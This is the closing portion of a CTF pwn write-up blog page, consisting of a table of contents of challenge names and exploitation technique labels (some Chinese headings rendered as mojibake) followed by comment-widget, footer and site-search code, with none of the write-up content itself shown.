toc-level-2"><a class="toc-link" href="#0x04B-cmcc-pwnme2-ret2libc"><span class="toc-text">0x04B.cmcc_pwnme2 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04C-picoctf-2018-shellcode-shellcode"><span class="toc-text">0x04C.picoctf_2018_shellcode - shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04D-npuctf-2020-easyheap-off-by-one"><span class="toc-text">0x04D.npuctf_2020_easyheap - off by one</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode"><span class="toc-text">0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04F-picoctf-2018-got-shell-got-hijack"><span class="toc-text">0x04F.picoctf_2018_got_shell - got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free"><span class="toc-text">0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x051-0x060"><span class="toc-text">0x051 ~ 0x060</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x051-axb-2019-brop64-ret2libc-BROP"><span class="toc-text">0x051.axb_2019_brop64 - ret2libc | BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2libc-1"><span class="toc-text">è§£æ³•ä¸€ï¼šret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ABROP-1"><span class="toc-text">è§£æ³•äºŒï¼šBROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x052-axb-2019-fmt64-fmtstr-got-hijack"><span class="toc-text">0x052.axb_2019_fmt64 - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><span class="toc-text">0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x054-ciscn-2019-s-9-ret2shellcode"><span class="toc-text">0x054.ciscn_2019_s_9 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x055-axb-2019-heap-off-by-one-unlink"><span class="toc-text">0x055.axb_2019_heap - off by one + unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x056-mrctf2020-easy-equation-ret2text"><span class="toc-text">0x056.mrctf2020_easy_equation - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x057-bad-ret2shellcode"><span class="toc-text">0x057.bad - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x058-picoctf-2018-leak-me-leak"><span class="toc-text">0x058.picoctf_2018_leak_me - leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x059-oneshot-tjctf-2016-one-gadget"><span class="toc-text">0x059.oneshot_tjctf_2016 - one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack"><span class="toc-text">0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05B-x-ctf-b0verfl0w-ret2libc"><span class="toc-text">0x05B.x_ctf_b0verfl0w - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05C-cmcc-pwnme1-ret2libc"><span class="toc-text">0x05C.cmcc_pwnme1 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack"><span class="toc-text">0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05E-inndy-echo-fmtstr-got-hijack"><span class="toc-text">0x05E.inndy_echo - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05F-gyctf-2020-force-House-of-Force"><span class="toc-text">0x05F.gyctf_2020_force - House of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x060-suctf-2018-basic-pwn-ret2text-ret2csu"><span class="toc-text">0x060.suctf_2018_basic pwn - ret2text + ret2csu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x061-0x070"><span class="toc-text">0x061 ~ 0x070</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x061-wustctf2020-name-your-cat-write-out-of-bound"><span class="toc-text">0x061.wustctf2020_name_your_cat - write out of bound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x062-wdb2018-guess-Stack-Smashing-Protect-leak"><span class="toc-text">0x062.wdb2018_guess - Stack Smashing Protect leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x063-zctf2016-note2-Interger-Overflow-unlink"><span class="toc-text">0x063.zctf2016_note2 - Interger Overflow + unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x064-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart-Overflow"><span class="toc-text">0x064.æŠ¤ç½‘æ¯_2018_gettingstart - Overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x065-wustctf2020-number-game"><span class="toc-text">0x065.wustctf2020_number_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui"><span class="toc-text">0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning"><span class="toc-text">0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x068-picoctf-2018-buffer-overflow-0-ret2text"><span class="toc-text">0x068.picoctf_2018_buffer overflow 0 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement"><span class="toc-text">0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06A-wustctf2020-name-your-dog-write-out-of-bound"><span class="toc-text">0x06A.wustctf2020_name_your_dog - write out of bound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06B-judgement-mna-2016-fmtstr"><span class="toc-text">0x06B.judgement_mna_2016 - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash"><span class="toc-text">0x06C.gyctf_2020_signin - Use After Free + tcache stash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06D-picoctf-2018-are-you-root-heap-trick"><span class="toc-text">0x06D.picoctf_2018_are you root - heap trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode"><span class="toc-text">0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06F-starctf-2019-babyshell-shellcode-trick"><span class="toc-text">0x06F.starctf_2019_babyshell - shellcode trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BA%8C%E6%AC%A1-shellcode-%E6%89%A7%E8%A1%8C"><span class="toc-text">è§£æ³•ä¸€ï¼šäºŒæ¬¡ shellcode æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A-x00-shellcode-%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B"><span class="toc-text">è§£æ³•äºŒï¼š\x00 shellcode ç»•è¿‡æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement"><span class="toc-text">0x070.actf_2019_babyheap - Use After Free + heap arrangement</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x071-0x080"><span class="toc-text">0x071 ~ 0x080</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x071-xman-2019-format-fmtstr"><span class="toc-text">0x071.xman_2019_format - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack"><span class="toc-text">0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x073-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-STKOF-ret2text"><span class="toc-text">0x073.å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x074-hitcon-2018-children-tcache-off-by-null"><span class="toc-text">0x074.hitcon_2018_children_tcache - off by null</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x075-roarctf-2019-realloc-magic"><span class="toc-text">0x075.roarctf_2019_realloc_magic</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x-0x"><span class="toc-text">0x??? ~ 0x???</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-houseoforange-hitcon-2016-House-of-Orange"><span class="toc-text">0x???.houseoforange_hitcon_2016 - House of Orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-lctf2016-pwn200-House-of-Spirit"><span class="toc-text">0x???.lctf2016_pwn200 - House of Spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><span class="toc-text">0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81exit-hook"><span class="toc-text">è§£æ³•ä¸€ï¼šåŠ«æŒexit_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rtld-global%E7%9A%84%E5%81%8F%E7%A7%BB%E2%80%A6"><span class="toc-text">_rtld_globalçš„åç§»â€¦</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E2%80%A6"><span class="toc-text">exit()å‡½æ•°åˆ©ç”¨ç›¸å…³â€¦</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libc-2-31%E4%B8%8B%E7%9A%84-exit-hook"><span class="toc-text">libc 2.31ä¸‹çš„ exit hook</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9AFile-Stream-Oriented-Programme"><span class="toc-text">è§£æ³•äºŒï¼šFile Stream Oriented Programme</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0%E4%B8%8EFSOP%E7%9B%B8%E5%85%B3%E2%80%A6"><span class="toc-text">exit()å‡½æ•°ä¸FSOPç›¸å…³â€¦</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-mrctf2020-easyrop-ret2text"><span class="toc-text">0x???.mrctf2020_easyrop - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-calc-ret2syscall"><span class="toc-text">0x???.pwnable_calc - ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-silverbullet-overwrite"><span class="toc-text">0x???.pwnable_silverbullet - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-dubblesort-ret2libc"><span class="toc-text">0x???.pwnable_dubblesort - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-317-fini-array-hijack"><span class="toc-text">0x???.pwnable_317 - fini_array hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-spirited-away-House-of-Spirit"><span class="toc-text">0x???.pwnable_spirited_away - House of Spirit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2nd-Pwn"><span class="toc-text">BJDCTF 2nd - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-r2t3-integer-overflow-ret2text"><span class="toc-text">[BJDCTF 2nd]r2t3 - integer overflow + ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-one-gadget-one-gadget"><span class="toc-text">[BJDCTF 2nd]one_gadget - one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-r2t4-fmtstr"><span class="toc-text">[BJDCTF 2nd]r2t4 - fmtstr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-text">åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„åœ°å€å†™</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-test-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><span class="toc-text">[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-Pwn"><span class="toc-text">V&amp;N2020 å…¬å¼€èµ› - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="toc-text">[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><span class="toc-text">[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81-malloc-hook"><span class="toc-text">è§£æ³•ä¸€ï¼šåŠ«æŒ__malloc_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BBstdout%E5%8A%AB%E6%8C%81vtable%E8%A1%A8"><span class="toc-text">è§£æ³•äºŒï¼šæ”»å‡»stdoutåŠ«æŒvtableè¡¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%AD-vtable-%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB"><span class="toc-text">_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable-%E5%90%88%E6%B3%95%E6%80%A7%E6%A3%80%E6%B5%8B-start-from-glibc2-24"><span class="toc-text">vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%A7%BF%E5%8A%BF-under-glibc2-28"><span class="toc-text">vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-warmup-orw"><span class="toc-text">[V&amp;N2020 å…¬å¼€èµ›]warmup - orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-babybabypwn-SROP-orw"><span class="toc-text">[V&amp;N2020 å…¬å¼€èµ›]babybabypwn - SROP + orw</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNCTF2021-Pwn"><span class="toc-text">VNCTF2021 - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-White-Give-Flag-read-out-of-bounds"><span class="toc-text">[VNCTF 2021]White_Give_Flag - read out of bounds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><span class="toc-text">[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4"><span class="toc-text">glibc2.32ä¸‹tcacheæ–°å¢çš„ä¿æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-31%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-text">glibc 2.31ä¸‹çš„ tcache_put ä¸ tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-32%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-text">glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc2-32%E4%B8%8B%E5%A0%86%E5%9F%BA%E5%9D%80%E7%9A%84%E6%96%B0%E6%B3%84%E9%9C%B2%E6%96%B9%E5%BC%8F"><span class="toc-text">glibc2.32ä¸‹å †åŸºå€çš„æ–°æ³„éœ²æ–¹å¼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#what%E2%80%99s-more"><span class="toc-text">whatâ€™s more?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-hh"><span class="toc-text">[VNCTF 2021]hh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-LittleRedFlower-stackoverflow-orw"><span class="toc-text">[VNCTF 2021]LittleRedFlower - stackoverflow + orw</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#N1BOOK-Pwn"><span class="toc-text">N1BOOK - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-ret2csu-ret2libc"><span class="toc-text">ROP - ret2csu + ret2libc</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: 'è¯´ç‚¹ä»€ä¹ˆå‘—...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright Â© 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CTF.0x00%E3%80%91BUUCTF%2FBUUOJ-Pwn%20WP + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2020%2F09%2F08%2FCTF-0X00-BUUOJ-PWN%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
